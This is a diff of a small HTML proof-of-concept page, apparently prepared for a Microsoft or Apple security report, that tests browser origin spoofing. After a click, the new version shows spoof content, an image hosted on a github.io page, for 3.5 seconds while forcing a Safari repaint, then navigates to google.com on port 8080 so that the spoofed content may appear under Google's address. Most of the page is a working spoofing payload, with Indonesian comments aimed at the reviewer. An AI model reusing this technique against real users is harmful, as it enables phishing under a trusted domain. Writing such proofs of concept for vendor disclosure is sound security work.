@@ -1,46 +1,66 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-<meta charset="utf-8">
-<title>PoC Visual Origin Test</title>
+<meta charset="UTF-8">
+<title>MSRC / Apple Security PoC</title>
 <style>
-  body { margin: 0; font-family: system-ui; }
-  .spoof {
-    position: fixed;
-    inset: 0;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    font-size: 32px;
-    background: white;
-    z-index: 9999;
+  body {
+    font-family: system-ui, -apple-system, BlinkMacSystemFont;
+    text-align: center;
+    margin-top: 60px;
   }
-  button {
-    position: absolute;
-    bottom: 50px;
-    left: 50%;
-    transform: translateX(-50%);
-    font-size: 20px;
-    padding: 10px 20px;
+  #spoof {
+    display: none;
+  }
+  #timer {
+    margin-top: 15px;
+    font-size: 14px;
+    color: #555;
   }
 </style>
 </head>
+
 <body>
 
-<div class="spoof">Origin A – github.io</div>
+<h1>MSRC / Apple Security PoC</h1>
+<button id="trigger">Trigger Navigation</button>
 
-<button id="go">Navigate to Google</button>
+<div id="spoof">
+  <h2>𝐷ℎ𝑎𝑓𝑦</h2>
+  <a href="https://example.com" target="_blank" rel="noopener">
+    <img src="https://ecdnts-del.github.io/spoof/9de3dae67d67214fee46527f2a5b8d6b.jpg"
+         width="260">
+  </a>
+  <div id="timer">Visible: 0.0s</div>
+</div>
 
 <script>
-document.getElementById('go').addEventListener('click', function() {
-    // random port, sinkron, user gesture
-    let randomPort;
-    do {
-        randomPort = Math.floor(Math.random() * 1000);
-    } while (randomPort === 0 || randomPort === 443);
+let elapsed = 0;
+let interval;
 
-    // navigasi top-level langsung
-    location.href = "https://google.com:" + randomPort + "/";
+document.getElementById('trigger').addEventListener('click', () => {
+
+  // tampilkan konten spoof (user gesture)
+  document.getElementById('spoof').style.display = 'block';
+
+  // timer visual untuk reviewer
+  interval = setInterval(() => {
+    elapsed += 0.1;
+    document.getElementById('timer').innerText =
+      "Visible: " + elapsed.toFixed(1) + "s";
+  }, 100);
+
+  // pastikan repaint terjadi (Safari)
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+
+      // delay stabil > 1 detik (disarankan Apple)
+      setTimeout(() => {
+        clearInterval(interval);
+        location.href = "https://google.com:8080";
+      }, 3500); // 3.5 detik visible
+    });
+  });
 });
 </script>
 
